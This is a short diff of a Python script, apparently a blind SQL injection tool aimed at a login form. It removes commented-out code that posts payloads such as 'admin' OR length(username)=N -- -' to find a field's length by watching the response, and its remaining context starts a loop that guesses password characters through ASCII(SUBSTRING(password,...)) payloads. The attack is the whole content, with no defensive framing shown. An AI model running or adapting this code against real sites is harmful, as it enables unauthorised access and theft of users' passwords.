@@ -5,17 +5,6 @@ page = ""
 length = 0
 code = 48
 
-#for length in range(1,100):
-    
-    #payload = "username=admin'OR 1=1 -- -"+"&password=pass' OR length(user())="+str(length)+" -- -"
- #   payload = (("username", "admin' OR length(username)="+str(length)+" -- -"), ("password", "ezqsd"))
-#
- #   res = requests.post(page, data=payload)
-    #print ("Length : ", str(length))
-   # print ("Result : ",res.text)
-  #  if "quentin" in res.text :
- #       print ("Taille = ",str(length))
-#        break
 for length in range(1,100):
     for code in range(48,123):
         #payload = (("username", "admin' OR ASCII(SUBSTRING(password,0,1))="+str(code)+" -- -"),("password","azea"))
